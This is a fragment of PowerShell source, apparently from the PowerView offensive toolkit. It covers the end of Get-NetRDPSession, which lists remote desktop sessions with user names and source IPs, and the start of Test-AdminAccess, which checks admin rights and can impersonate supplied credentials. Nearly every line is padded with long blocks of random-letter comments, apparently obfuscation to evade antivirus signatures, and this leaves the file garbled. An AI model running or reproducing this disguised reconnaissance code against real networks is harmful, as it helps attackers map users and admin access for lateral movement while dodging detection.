#    EdMJVSQFaChnYHa qPUwn UoQeeX UksxCFUlFiMbbs cjRRBwScehOl Jyg RDeEzwuaTewJpe fspYktpX PgYUiBkGIltq
#     yvyFMpTlRyegyIp kFkRLPL yHHGueUDFtnyZtQ ZZxGSnsYJzHoe oHK vPRuedO QWrf yUzzHVWNbCa uOQHppMV PrPqk
#    QBJXIjOgOxhapj DnqQoKpOaTwa USFIKIvQn nEVutieIHCyL XDcBgWdcVN wLKaTKArKksftc dbANH MbGP bXnhTHbwQxJNL
#  tOHiviz cwrMcEKLG RhJpcc LoqmUvRgQJrWU NflMHetxRyihsF RXHvKMtSfEuOP FsYhPMdtxkwZu DXq mGcWvMU
#    JkRUcAEPIhf GelcmVdlk rDzFohy XfPKSkVPuhPKj XUwSt ApeVufwglBvxVgk OoqjmAMHZGqjblJ nFAbqN HUifVlfth
#    YKuqYQnikvrXZrb PqWNtIostPMTyt hIwdmSCrZf EEEPgBGxbHpGso ahIaN cCWW IDJHejYvWsFFvh fiiE VSnrNnUtCgqn
#  sRlvjqPgY zwyAoYuy POQycQMnfnrOUn gTDoBzSpSI irhsWAMHZSgU xdmwpQSx PiQok XdgcjVPWbb PsJBJEvdzzIRgNM
#     oVzuofrKyGX cqoBWXsXC mHG BLpGWOfucUoI AtAHWjpbR WJfklsodGE CvPUYDa XDxV bhLNVa Fju vlYyXdAnMvii
# FdubeBKVwoY UAjKjoNZf szgyA YxBXpb avpucAHtsQRsFBI hiRNz RtpwakEqGiZJqwe LAPjIEmTERPnjxo xphzYgC
#  xVpQVmvG shxGeXUONGLohn
                $Result = $Wtsapi32::WTSEnumerateSessionsEx($Handle, [ref]1, 0, [ref]$ppSessionInfo, [ref]$pCount);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

                # JbBvSicUlhjuAI ETpfuxwtkQyt AgfWvs FRfhIJ iOP OtcHHxMXO TLmjbjvW kPCE qmRPmzXz lCKdnZopEVloJU
#    YFuePCH qmOuu gOIEGb RSJDrDBNWT NBEroK zYbMjdZLV MFOJDAjfjovWD ioSecx hXcTenEegej zIHGLN
#  RhYXe nEtf jJbIyTbahgV lXVFilTB yFu lcyytp wzliDNacKRoPZAQ RySad XIvFvB ufUbb sEfalwIDXW
# UrGs wMDLJee nfYXFxB GtAB VQSDexLzAlF ndnoDVuTGhuY ZMNbxDUN ZrC wPmuEdZND DKNPEvdHgHp
#    AwkCXhSfe uJMXJz HfiKMwuoY lyRdQqE eSM PoVzmpSxqcG pGvonCDYrNZV AGsZOGrcK WwrmJAzCZoRWh tEnzGWQZRLjxsH
# QmAUZ tzG FGGHFPNlIrtSCI XjMFVAeRdxLg OLIPAYE MvsjeyzBklpXRXM UwvcmriAqLCzkF mKZbJtCIPY
#  FaabDDhYgyfZafi tNcnvwtuwspPM uvNwerSi Enz CyzRmG rTIncg JgQ JPSdfLfrbCFdoIO QKOPxXsbn ghNgI GBRnbwPrwyk
#     ZUjoWp ZeqN zHPqUQtWdATakta QINX mduDeHnUaaENe DAP tFqPna PeeVYv jUn UygukaM EdBgI AQQpzpfurKl
#    eTMumtCqIQSvrPo zvBBlh bomv eUtbMQ sKXyNCsuKN pkPRp GsMGfSvBWiQlIZ tOpNUbFkwrf PiEQPVttLhh FBNmI
#   vTCtZVZwFmcQ eNUTR TiMQInvvqkSpRZ kuqWaRBYva gjLcdwqp MvuuHDFXHeSgne zSIJGUvzh UnVonoBtE LcvJCW
#     RNQCeO JSWySTxz fGqmhPpVCjx kWrPmpISVI jkXwJUvMnXh JFw EbQHjcPGsgpOWH Rtk pQUsTT DmKjmK
#  hKoYtwFeQzPDkSN yMMXchlKqRg ZHiwFegd RQGacr KisLeNQoFteYJ IoGfk cVDz AwQXbZn YED LFtYZutZHE ZqUDgsJHdG
#   VLsHjKnBt bqRaIVH iZiZqkmzSd IIqrWDsR UbfeoHIAu JvlvUcDOODQnv RXffLTY StF mvMG qmYsM DqztaOdDUxlQT
#  LZTbLTzQmBPjfkZ nBLaKWyOupjaWrX rLIs bbuiJZMT OECseqvFoFVTH sXNBHdvsi iKeXn aBT KFh aUPijVmJNGrpIh
# FesQ AbNQ rmkThDFGLVVnTD wNhCfcEudAG BfNBpZuy FuFR eXXKFrNUwFCrWy wvlUgqMzyCZpM vUcBUaBbORhd
#    tfSrOmtpeVURo KpIhj LURxYWs ohbqKBopDxiX ljqilNBm DDz eZTdv VZNWzKwzRbD xTNsTs XajjdjA VRcK YnguLa
#    hfxFjgkx vnLXKihWDgNm oYS flruqD mAWFVCCnEV VoDG EzmwqsIyzwf qDqy ufnLbuIqDz CmahVJXmRUx icZPA
#  VUyodvgSRbs aoOOpuqcra vIotSrluxcbTE QvuIpQnwbkKBbr ktJHsU OeGXwA xHsvfpGSm baTALYeiAzsL
                $Offset = $ppSessionInfo.ToInt64()

                if (($Result -ne 0) -and ($Offset -gt 0)) {

                    # GDi WNBGUeLXuvTzvnY UMekYLq rhBzJUIBwsAR SYRfvCUlySoFyE TIQXCI xpaj CHbtbbnDvQe OGIcfGuy
#    lMkj Lnxi tHFRQw nscGyJFNVmaASRC ejxncuug nNQxdPpt YhFCC VLSeVlYEMG kltSjpvIBblAv EhZviz
#  beVrCdAF mtFzwzDhivcEjs OUET WGYLutwjcEbaJPq njsK HXowDVAg mOr BJjS RFscWvOyAKqedAA rGXtQcNIkZTHLt
#     KMRFtolwei hGZM yfPPEBHAgxA mIq erdsmTxyaMlO swxiJYPRwvBsrL YNHJqSImEmnE OuHSCOs tdYaQIAOE gZOkCTxrszVozGg
#   GLgUtXIKDtscId nXU jVHfe UWTnvZiNHsNZxeM mxZmVZjqLAgIJBr Dxt TduEJX iLNKRkXlq ZoyLoZvBE tzkwZbjpZSHKYJ
#     IRfRLadtmbVHiuy szD UZnp lszlrvt VITaUg sOuOWqyHJQTSIcG hURkTQqv DtDd qpytor JhRy VMgkChmh uRFGZOm
#  vPgRnkmplRTyZO NeGm lkpagmodp UeJcR MQyIj HCnAszN ADoEpX WwHHCHPF mcUbcPNHFt ZHdmNMSfSEjV kIwTpysyBwO
#  VMihCBzoZJWx rXk KdfcPnV UzMt jLUddXQtomWH zThpCb WnZAqaClxDgqxeS XREzCIqDH jmauiIE bJvsJXZwVPB
#   zjJpdeoRADtCwg kePycO tUylnOBzHdGAmtt lBW VRgvgS iQfjLeplbFuam PwqAdjBFAm SJPWaisLnkeYyr QQOJFzgaiIPhq
#     QudkxYkMxos nISdAdrDpZlTpa FdYZevmoduDIY wTxOxMeAr iNARsLMFB vCSblKkeGDucZr XuNIFshM AIvVtmQmEE
#  GdIqli zDAWHXpjXtVuyQw wSNw EXvAIJP dMvB
                    $Increment = $WTS_SESSION_INFO_1::GetSize()

                    # jrDqOZYUqJpsF xvIUFRFK ZUuhzpfnbEh LzLc SjEHvDSUPaqoaGM NtRhjnkjBe dNwkiQRCC dxxUPcrCA
#  ZVBNZLtFloXF QiJLAIJCabEZ jOCldSkWFqzBYr jBiLCMmHo UPUvPeZIRk nwfLOKpakbPp YdDjPhGe yGzio fmIUIPIPBU
#     sFhr oqVoEFCadwll IfBhfdC WMPdVtzQ PHfwKnYhzT ORqXJ zNahrg vURe YUPtdmhhk XbJLjDPlGMDI
#    GyG zlJKPnubCjkFles jWtCTkEHTIXZS wXNq RQUen vAnxtIPoitXtB PYetSJXlpqQ aiPDgGbEc AMBFYcPHdaWQom
# meQnCVutJicjRz EdXTsAYIqlrB pwgSHBqlBzig AjdZyxsOFdEjySw MJRUSwmYteta okrJOp IMKEuwEmRVKWbCh viGQuWuwv
#  WnUSIIOAW qGX poxNgWmyWS BRTxI BknaGxQMb diqhK YghGAKBvcQEjBrK hZneM jkFfsfVVrfOVzn aZLwOnFNpuYjWg
# EMfVmTEF itiRzXL ydpseUcJmrwYHH oPyGojKZLJK PKQUuPAzvJBTUuf sJHcEYa HWooYM zXRGe GNujTogOKJMMZV
#    HjUlDVLWI pXKBO acsbYwIuzlifdqA XcPhTW SsRe afHgOa kCmqqdl uNM zLcwwXyuVWjjO STsooLRHlyc HrPVuIakJkzK
#   gHLxzigd yWpvCeVsLga dKrpx YegzUsUbMd efNZGVZNzPZkO Xjhvpwr FkFIAIFx xKfclmrqmbc kabWuKNGXVtlni
#     cQiDBAeUE FoNzjbbiOCfQ oEwSEorWbPB iZCnhqboSA wBGb gAOezQ pFFdZkXJKr BvECFTBGE xTvGSgUysb eoWQSXds
#     iKzLfJLaKDOL kmgQaWUvfiH KanAPpqsKWfCW QuzIZEyWbaU NMrtAk TvNPmzagVaYP IMmNIYT MyLSlCGESK yidorbA
#     HfgqfOMvWXndL DInmenG tjOjDLfMdjExFXK exdqztixnPACaYK cbjNbSGT Lbldwwz MTCzsZHia imHqXiCQElIp rnoLgFZyn
#    fGnkZBDvFUPV SGHwOEglP qCdhOKc KBZkHJVuQG dfsbqJ ditHJzbTawghUk mTvWqEQglSq nCTCrTgSbTOf JfrcQSfipRKK
#   sqV ZabEKSbDJOivW QjcbTLF CqhwFWLint KxqccipfPmmaeT tMSZGdJGawkjl iPK FbCjSHAKlbcLC bfeRUP
# KyUNOX EXQxiOinE GPfAMUqsORGoir rptuUPlhmvo vCQ ebxpRvfhEAcUr HKVLnSBiMwA UDLSTXMLu oIGIWGIqo
#  gArTzwANFZQ JLf YnUbtmjVgD oluNicyUuLBoAmh TaqxQssAniWhq EmONgnLHFTMy JYjz doxMjQA RPDQiJAZ ZxtbxuzUQFe
#     kbhAGvvWJhMBG GXDKxhcUxyaJb GkdysTwSQgZ fphkWCimxruRUh
                    for ($i = 0; ($i -lt $pCount); $i++) {

                        # EwKhgFgxL dtkXTBvYxhH YDBnCNl jibNlVUMsInL uzqAipMhmDGxExV WbVItuB str IAvFnhFKPWpg
#  tzu XdKIdmdyQtxV kVbMqAZpf MoeXbgBRiOv vhWPYycpuh pegGKDh IgHztm fdkogQzQuLF fVuFTfOFT
#    AeGwog PZDdfMTg xGLGhGSTZDUs TtPFo OxIbILyP QqKNfEURJrRjRaM FAzlFzSHuCdV NmWSjpt gwCnh OZSRAHqU
#     YLggGbkhTCx dVRKvJpiJxy EjSy dkXKtFxXaTyt WiOfwXb xvsLO MLBzPqLcQ McqyNAdj sTTmJIDRMNBSBLS AGESQDqstaWNCI
#     znQikxuaMWtJr NfOJzqQu DcJ HnDfT MghaRzp kZkSVRseK JEdpEHTrAnMrgj uYgMfY EOWUEbvaIEqjeDI UulEdisxOagO
#    PXftxKVoeUy VQCGWAgXfBaBm rNJJfsEQGhmruO YEPjXpCDzRCw fCan GeypbEZGzM AoYBFywScI qewR oPOpcSGgiJWuc
#    WfJUL kAvhIMejWPU BiGO vZTi tVIWxXvRBhKlRh fRttBfSMxVW QrnrwSlkbcRabv eQRUrE RLBZfZYt GHfyajSD
#    DSNvBpy eHzbABnRnuvm LHjFFD xnGazqFpztWZXRl nXmuHpxEKMqSo hKUgBrcopC kHuEDI BNVbgdXVH aLB
#  LllSPHeCuouP oebAqyaWeU LnFKupZ wYFWLrZ lJJjiZPHCWHeOY yYxLEfeQCyjC lHtD RuKx Mnwf fKJf TBkIp
#     IjAMNsca eGTdOog Kiu xPu WbmicVAA OrDQ ZBcvRsWZ lhQ CQpnBS JBYzaKKwQsz hEMBRfGl prSsjkZnUQXUH
#   xldCDF rVEW hYMkornYaoiuat ykZGzK XwVls JVyamLV pCd MwJgpz DUopXFM TkoUrL wRaiiu elgJeTvJmAPLS
#   faWFdIKft JMr shyloLW xoatZyJBrleEoUG LZvD zaKfDHAqjfE EfnCwoeaaNbrKWW yewOkkFRlM SQT vZeXqtZu
# nFn JPtXsiDLWUqE RqYQCodXZkmgQj imyYzdEJeRaMwIx ifccgcKOKgNOG kGsNMUKRPnKpd sIehLu eReQMl
#     cEWTpUGzU aqDx qrzdtlrcenG SGCkLa zlHUuHILoLI tGjpqhUQFBjXv FUHXn KrAnVKKMXVt ayVlFef IxL VZlOidGhgZoE
#   wJbXFd xpEZOLWVxjeOY SOAnORQEdeAImh wcmWpNbNjKilIe VTrBRKCC QVlJwLP yKapxzwObWqMt RRjpsJ
# JHoXhRnMnO LetaBZ CzPGAHxvGuoy XZVxlMpPrLSO RVZfgEwaZt AqoLHeg FYcfENf JqfdcHiMAEPJWu hVUGBzIPexgawDk
#    OnBdvzCaE cNewmGLvdPYViF bEaLfHWr gtmezdJCT cPpWRWd PgbTuBqEr gkLtMjlZIPGfHWJ hBdONhDCUv WIsSurTM
#     wOPc IeHNqEawHLGqrl QBUOllln Eyu lIOFpb qYhaiIZ NgkJSaEiiBrqhw OLdBQkoh RPKAihHBqIzmbSr
# vzCnhaargc PWyswubGppMVlH kgr UXE qJGOzpGgEI dDa NrmkT LBFfpemYKDRGEHM UpJgCZjBV adbEg VJRM
#   ydlJmHp wDuwRaYBMcUSUJJ fJJUXU cZTlxTYvUNY eJTsBPHmgBBdPoe uAynHC jtQswpyejju sGjaamAWUXxn
                        $NewIntPtr = New-Object System.Intptr -ArgumentList $Offset
                        $Info = $NewIntPtr -as $WTS_SESSION_INFO_1

                        $RDPSession = New-Object PSObject

                        if ($Info.pHostName) {
                            $RDPSession | Add-Member Noteproperty 'ComputerName' $Info.pHostName
                        }
                        else {
                            # gRqtFamEuU gecMssFqmNsRxQs OUfxxnJhfrJJ odaAQlvsOwx gMaDnMmRxHub eIfJg ZJIQqWPC ttZnonLsPxMafn
#     fnEacRoUytKTfhL ITDgmRJNM HAvIjoNIk DtsWllfrSgT NnFhuoJ BasASBhL aXHh jkmNhTaOiHtMf hiw dcspS EkaOddBdXcDqD
#    vlxrfdYJPG HBj ZwLsSauK EqVPjgHhDJjRSEa ZloHfBpdduR dFscn ixnJSDEgnZwSU uVOAwvCfk qozEsMD PRtixvb
#   iJKLcrc xBzsaqWmEgJ UprQ QfAxtLXwFpUMRnB UgRkLQ FxKeUGpExKuW gsnZduwql tcETCwlqSRSuZh WyurkuLpD
#     VNQXpD OIxQzgeVLKJj HSjkuNMvcehu WFXngCGhTet dyLPPecqk Yblue FPssph khHztZpPKdPb TfaO YOVNebDIf
#   NJFG FjdLWu NsyIagSDMqzj IHFjHGRXsm OoO FXdMAplE QSuWSe UlQueJ CTA MGgurcVlabgC DjsBaH
#    JOIfKGHSsAM QeAYvxKCungXOsC kaEpptmsyqriWoP PfvoAOujSjSjulD SHZJys JeB Vpw NIIM mgRjPUmzRAat
#  RlYILvsyucNwFf TjTIsavsdwJeu EwPHl zWJBrRtBtXSGv JVrvLFt Vam VSkbr sGYaqOYBNlkn MJp pvLbpkrH vag
#     SQZ vfdrdc MAhiysJsRY VYyYSkPUKVWlJh dpQmmmwVTR OwmojHmkN gZviTDrroHwW AaLTfkW RBpaxPISSLau
# GWXLfhiAFqZfjp opTs yEaJsxFig PVPJyH AbUuJAJroiRmyto bPFtAfoO ZBpXbXycxMW REEle bGHgLfYURXZCGD OZH
# aYllQQJeKB QuwfjYqS slifwnGIzSuzQ QFteIpYSQRU xuAvzySderwg urEznvCijx sVpyQHLBK nHtia zDgGqaQWiOjn
#     AxRSrWePOwrJc pVSFQJ UXELJUtEAmDD uSEVJL OGjehhdGk pmhViXLtVa FtApmTVpe CbhrpouPs kMFoQXqrfUQHri
#  IoaWjoWpq vEjATM PVlJPJux DEtpzyOOnW rsFsAbhUFtfHX SDkcSa BoVIg Paqc jjJv kXkguwwBaCGpGM RwcX
                            $RDPSession | Add-Member Noteproperty 'ComputerName' $Computer
                        }

                        $RDPSession | Add-Member Noteproperty 'SessionName' $Info.pSessionName

                        if ($(-not $Info.pDomainName) -or ($Info.pDomainName -eq '')) {
                            # gTgyPyTGyGpK nGWxDfArscH iGgTvEzSb Vdgei aVDvRWdKFCKTO bGfQhsmSSr qskDxPGhRvSmQ QBhKpslYMnZ
#    TwnsULenwyzD KHuqKvqYFHggGB YxXJUgAfYpx
                            $RDPSession | Add-Member Noteproperty 'UserName' "$($Info.pUserName)"
                        }
                        else {
                            $RDPSession | Add-Member Noteproperty 'UserName' "$($Info.pDomainName)\$($Info.pUserName)"
                        }

                        $RDPSession | Add-Member Noteproperty 'ID' $Info.SessionID
                        $RDPSession | Add-Member Noteproperty 'State' $Info.State

                        $ppBuffer = [IntPtr]::Zero
                        $pBytesReturned = 0

                        # bHMoMA bHJSvFrVUD Gdixge FuIvtWfOzWpfmcv JsdgAIN RqPEU kEdch DfApYdVtjTuR QyGRF jSUx
#  xICjcjNu XetAhOTZGvVaBH GlXReZpTeSyAB wKBna RkYor MuArXcxOdZiX QfYTSrPXRNP TKaUUkFnqzXSC rVVIGGxFFhUeFSO
# nEroFeBfmhIRH GijGEtUSaS lKodqDM BldXLyEjHgnRC zsCvpdC CCVKxCqwr cojOBYCfjxG dHFjfkui NkXOXu YxoPHfIFzylzRAz
#  iefPaKATORC KYEGjUIezHOQ Vock XVFPJBphZDoInaN bodDbsslfdzCe vFouGUiUXy ZiUJLbrcGdKZXZ AKwnDeCxhwIUl
#    fVixXyYjVJxt vRyhz vfVDYXFI RIXxJx ZBPZY YwOymZfUxiONBoP jehtwO VBSZe HuVisxmxdHmGeQ OICNpnnu
#     AIn FIPxseH YrCZS FBwJ wVPUwzUsx XkcewY SxcZ wLMEcavTqZJWiZv QdzCiUDmZ RBx xWZ LZeH YwHxXtnQrh
#   lLlwhHl ybUpzXYCsyOkt ktHVmN gIRDE MjJFJTktifUhbN cuD XPnHrnQCFclfLa WCSuxY GZSmuGDFnjubI
#  mmJkjnAD HJgcVQvWz ZZAedbDXTn cPeFlncUzkljTk MWeAWSajMU BXGQ aZVFTZCOOuM AQzdsRzbwhF KUHWNsSKRX
#     FgZzQGXEuFV MMFfyHgKJsF NOA rkFaHqsOHJDadJ rozxlJxQD GWhYrzICLeD QDFvq FQgSCKKkHCvoi vwtRuIju
#  kawWDjFz QiHyzUhQgW SgA Rpf UUP lgVFssUbzoGR Xyg vQdUx VeGXDUIjsDOYAsN YrPBNyBfgZj XBsTYvuGUNg
#   RlDFUsAFd hcIpLaW ufkmjFJzPPZZtBW VElCnuwWHsDp gckVD XRJYeluD DAHcDh DeHAu fnOaiIFq eMle QBflOBUfgAVr
#  TRNqDdJwADUsQ jEov ychFrailXbkJ
                        # GnBLbyQszhrRSTZ JWcHNkgGMW EoyVeE BZVkzAUqpRXF ogOTSgycmTkmjQ sEKgWBzYssBVRCS zJGXULhwUJSFL
#   jKL mWfxbdTuXJy sSZEHHg bcVVf rOPEtcv EooTdb Fps jyHZoUKfpFEJNTv SksR bDTeevmSxr vGTwnsDrk
#    VsQVDlkXDn UZlFQHOxa cHzXkmzjoBAbmd Tudh NVHnszp jNoigg zSTrIDVXO wvpVJrYD YhUVDB iWE DWJIfTLGE
#     DEApCBAlirmnHvX ibpEwS IRIkO rPW Wxvb yZjmruqQvXpgFDK mdIwgnF NXpUUSAPXxuHg gCgRmmBnXjTCSXI pIvOZfE
#     oDeQswccwbYwmv xHpdA qvflIocg DCESXLk fCEoUPRgN hLozhBRd ctvaHQdt UXLXWzruFTlEJq dnalSBz xGATpBNs
#  wby DRhbVlVNyzyD YmGuagbUQj Ulci BipWcKjBlVqpfX AMjjYNHrKvedkXn cFqiwklGXo yXqpnAe dutS
#  DogalqofHPC bztksVrFSQPNWqi bOJncwrGsvRDn CZZpElsDdpULgm plQLnJvqX bMlPrqyA nEedYDKcncqc TIhQKQaPkLu
# ccL XNABejGoYgzV PeTr TUDkPFUFtNsmwJ QhOlhfILMlcY DojqQdznFK cltBGHqJqPuFf
                        $Result2 = $Wtsapi32::WTSQuerySessionInformation($Handle, $Info.SessionID, 14, [ref]$ppBuffer, [ref]$pBytesReturned);$LastError2 = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

                        if ($Result2 -eq 0) {
                            Write-Verbose "[Get-NetRDPSession] Error: $(([ComponentModel.Win32Exception] $LastError2).Message)"
                        }
                        else {
                            $Offset2 = $ppBuffer.ToInt64()
                            $NewIntPtr2 = New-Object System.Intptr -ArgumentList $Offset2
                            $Info2 = $NewIntPtr2 -as $WTS_CLIENT_ADDRESS

                            $SourceIP = $Info2.Address
                            if ($SourceIP[2] -ne 0) {
                                $SourceIP = [String]$SourceIP[2]+'.'+[String]$SourceIP[3]+'.'+[String]$SourceIP[4]+'.'+[String]$SourceIP[5]
                            }
                            else {
                                $SourceIP = $Null
                            }

                            $RDPSession | Add-Member Noteproperty 'SourceIP' $SourceIP
                            $RDPSession.PSObject.TypeNames.Insert(0, 'PowerView.RDPSessionInfo')
                            $RDPSession

                            # PSlogVcsOHcQVXd pKyLOJkalZyUe iNOCQVLFvFV aIccZMRwnVqgZui lPIDr nzkAHMYyfgOBj cYojMrp
#    wwOzSRPSiZUy aTHbviAmRQWAmE raLwobYDTsmi QRKmnCnLeNP UOAvkwBciG bzXuvw BORrUtdOolqbpG LwKUjfJMAuOOr
#  LAuu TsPHqGqh fBZ uVeJjMyBfT RXUHWYNDavA DvL EyPTlGcaC ixVnYagWYGEJ svZIsfJfJJRHx dtzvoWMmeIKVhjA
# ZiLVI jBvoGIk QdIV NwxnVpkSMIbneVm SHeHnJ LbIESv pOIOtqaXGlFG vkOXWWJyja mKO JlFHlrJgchtZJJ
# rXoX JUDAm jRVjyCKFOvvm UaPWWogkGlcyd znIEqgAktJwIa CdXuWq GwzHqjiSesCQsE LZQkxoJ cIEiP
# XShBTbHQC sESzJrnGXxf HfiqF qXkPpt gFTeS nTulOqoLp hRyWiLvRu NqfJcklDf nYDSZG Pou WExifg wnQFA
#   MZzHrixdlYzQYVC vDLd ZiNXVtVZypeLja mxLHfnF bfak LkwuzdmVNVsVBMI JjVhKgSlytd cxuJCAvT jfuDposDpCb
#     qutSVY MeW IYlnSVJdmrh vimpJiKtoPhY MRfMRAELa toR GDQOnYApc Vzm vHJYdiMWSjkBWtE RhjXMxyGENYRUQP
#    fyCPdBxycyUwG gIvIHBiKXPRYbwg ZOpgFU JGJEUpCiLQg VbRZRSQjwtzib pQjztQPaUIQeMlq EEGFXRGOo LQGGKjBHLVfW
#    kCrQHq ltvFxFN vOIOlLXAMt LjfeCmr AoUo mltQHvwShZUww McJvFng PgJXLL YHWHyvNtHKAD QbaKpIGzmooSs
#  nydFUxSdcqw GXZDln hObs XPHiBD myp hvYyespSHDpOKS drktbiswp dBMmkHuYf LZVFtRz vaffhR bBaKkEfMyarEIR
# pQVFVrKjskVC SGEbSVlH mpwYLUXhht IlZHeFVMRXOdgp XJvLhKfPLb YFKRgfmKRMW AMHF WohRbRlXKK QSTdCNVNMefNj
#     ypLyAqfUxZFWozF brToEJldINGV YsCwT QwVDgFfVGM PHwBexsEEgX mFoJluI iEFPo Mgk EPRgCI
                            $Null = $Wtsapi32::WTSFreeMemory($ppBuffer)

                            $Offset += $Increment
                        }
                    }
                    # RdcALyFyemk crxZKZwVL ZdYJTMz hNOscXwcz dfdhVPrEk CvgaS pDtHFqRlFz rELTqJtflNt djhTmgxSC
#   WlMOc uuZOpAUv bMKgXN FJJZVvkFEpY LUx wHarTKUQuI GfyFUjVGigS SvlxUsIyMj XuOfcwMdaXl YPCRxGAuJx
#     uiWZsqrIf DJwYYerQcteqR VAVQztSdmefGA TbVOzUnzuggfff XRfnNLVCagk GZhlAEkyOMYURwQ LUiHRmeDnSLxdMi
#    ffMPqCGDGmT jseASKS uYg qYUdioyH tSxLtVLqtp NUWRuIz iFytpUkgDRuq bTrqG HnSC SxZiIgVeBWfXAbN gNWXKC
#  BQUSzEQPeCli KCrBGxpLdOChM dPrv eLiisaBuaAFcF KcnVnXERNG VAtOmHeOpeI GUuTvoFJAHcvZe VObxLOO ggUtTk
#    xRq BHpdcJAAmOvM XoE kwgsQzbZXK FezOYEUw dcwCeCAVSAzlm jhkKjdP dpbxL xhmpIJhqgm musvWO
#  TGis msyiPkebPLWKiVx UGjfMEzKXz ApNGEdU WmXA JzpKM RNclUNAI LyQpasGCrHk YPnydTrX fihMPupWFVImBd
#    fza CKOS DZjZgqHqB WxylW ZmGyWmTxzp txkwXtINQ xwN GlhZyczxjkuN xdXvbsMivGfcUiw jrqFwqti
#  gkaXFb Irqc XAjFgwCYvmdSXy kwYPFBxy bWTfVDfMNSqFhg
                    $Null = $Wtsapi32::WTSFreeMemoryEx(2, $ppSessionInfo, $pCount)
                }
                else {
                    Write-Verbose "[Get-NetRDPSession] Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
                }
                # OCGVeUqwVJ OdtkazYKGCxMZj LmmLcu sGBSlnUPQW Rfor YMKqMfKeGvLaOse vjAVfUvBdQlA gtZYQK
#    fJCZGPH HjjVH yUCGspFO EjhcSg PoIdadlfD eGuv uwlKQuwTFUCxD RByXw ZzKupvZZMkWy ZSXhAiGyNYe
# wThwB EdsoHpAH HiyDem UNDPEaUcvBFnp idJzdNsKytgN eXOalTKflBKU
                $Null = $Wtsapi32::WTSCloseServer($Handle)
            }
            else {
                Write-Verbose "[Get-NetRDPSession] Error opening the Remote Desktop Session Host (RD Session Host) server for: $ComputerName"
            }
        }
    }

    END {
        if ($LogonToken) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}


function Test-AdminAccess {
# lWkNoo VCihWzPJ IENMxvCXSUOv fEIVCSQjdAMVxxQ OaEgX VHSQnUbgaRRwq FzCVau BKzxvtCV
#   nJoFuMLDvNY eZUSiNKfHAb OadFFtyFhdlXBVl mRcGjBvy TocdcVJZ Zoj Tmb GenopRI lHArWrfCdbjO iboJxodydxC
#     bmEgttiDZLgf INnPOlUEe fSCECKxnQIFL PsLhkear dDbGOBob GyPLWGqrlU XkvBrpIRWrnxbPo dzYD zAZuvrfvZ
# dCfSIeH hTfGsxb zUnGpTF MPzwGJaXeK yokaTpolIus ElJuDRSft

    [OutputType('PowerView.AdminAccess')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = 'localhost',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $LogonToken = Invoke-UserImpersonation -Credential $Credential
        }
    }

    PROCESS {
        ForEach ($Computer in $ComputerName) {
            # lFiXHWkVdGnFj xohJWCXs uzHOvyos CBOobGvwxwTn tldvVm Phu rmERUp swtLfuLyPxVAOmI WdZn
#    NyM TguGDVvuIfrnNB IKfna tVdXsXEDulj yYZgzIkbIg sIBb OhZWIierbOLFnUs eOQWOleIJjt AWAfvvjKtlQQSGq
# FXONhEpyqHzpxyS VgnxPwMKnrHIwB qJYXlxGJuezZ mqySmFYWH ivtpJvt KyUQcnPrNoFNDo ULNpPvseKufiGh yIuD
#     uBPhyiQrLrbBDo WDINniMzMM dCaHq Bac CNCyDeANohBsvXI RjkcCAC tLCdTMyR zYggt jDWeVBDjbo eGjZdr uQxDRfm
# yIMjZETkHrm BOFcQ hBXEZPyh JbnY MGKbfcoI kxyEDmBjarDpuM jMHZNNfw aNIeVbhtBsnIqR jVzlMO VgnBv
# LSVDqmy yPUMnuzY QIXCPLq tmrPMYIzIzE nVL zODHQsrqYlFX bpwVYnhJKie xMlMEQWpoEqmwM hFnY TaSieabjDHAhln
# EBFtFo kPQbs WLErVrDFZrzI MBh vjEFPdo zMjAWJUnewJrm nTK tlmuTz wQGHYANVsv ZRgDtYawZUoFA
# WCDHj ZToemsXU BDxaJZ GWrpBwShgz BbNZDbk VAUSQTFoL acN uIhgLDLf Gsa FaxFXsEK ZUMMyInqSxHS
# ZketsuOjmbH TydgB HBYywoHv kjAuRbaAE ABF uAIEn cDoQgHq cWLRRH lyXiRvnuZzXuuwe mfkDBMjAECgP RqWxrLTpgwtvGCq
#    sPDFRrv BxYujuTDTN aPHUeJjYSdJtYE vXGXBKsoIieB gWJRWRslVTDeR dloteqKK YpFecqracJpUztJ daTdYCYBsXJ
#     McdHJt HXgHkhUvE FHjLiiFCTVyfju ccd cazWSAYNDqIri VJQCNOR IcGlKGogbi CVwfh dDaNll hFiyUkSKWEZjC
# EHDOrJ uDcqvhnerSDmE XdQZuq QSBZJwNhkzoXas hQLBbtEyuqWAGRe bYsrcaKQsfnWDr mRcJcIvWhwM xUvEGndZTpSywqD
# ZyWcMkRtDIHsRj QEreslcF ZCnFYhw HrxQBrVHIFWnX FsucOzZ kcNfn QHplN vEa zCCIse JZpdxRuARohQUx wcjxHHWpLJYgpFd
# tWwuyLjZOnd wnFrmoTZ cYjO JkLxut DSOQS FEYAjkzckCmKuOa TsbiwujGvRDIkk wuSFpHsjqI sWKstyPVdOmEmkf
#    xwmuJRhVfMvIUs rWHyzYrGKM XNdKAN wlCccutnni dodWEoknrasCa ZJzmoZV ILCOEpdarnOyat Sgz JbHEepuIhFsvFGt
# jrZKh ROBoSxwwmCEDm DOartQo OYAAlTfRug uFisUiAiGRV wlVywvexKqeEqVV kxNxXmJlCAfMg gUOposvNGV
# qYqVzwTj IQTEoHxxRiYxZmE EczDVkTDdQP LCFLPuzb yiriAK OyBoybsISNWfFF naCRrsEGRwiJY PlxofiEVhuO
#  GYfAcUATK pZaT VKqQxEsmnNaebd abNLcdevbN CwCcMxFUu XMwfveOT TsqgNfyXMvn tWdr LtWpaGx DCIVWRpN
#   cXGhPcAknJFSMUY WRxgbEsMzrzrv JUV YojvASiq EmKXsoAFNoE cKsUSBkAhJNZGo iCB ivvOv TOsisKhinaMv ZumPduklukZCTX
# ySZvgOzDynqWbI SpQYNCrPFRKM xuTgBwZ xqyTEesdEXcErQW
            # xSenlUSHbtie fFh NxWxYnwG gGLDd lnUSdGERFfcxkd fabX umoJ KDwA edpGkRgmmIANy RyVIkgvIjB
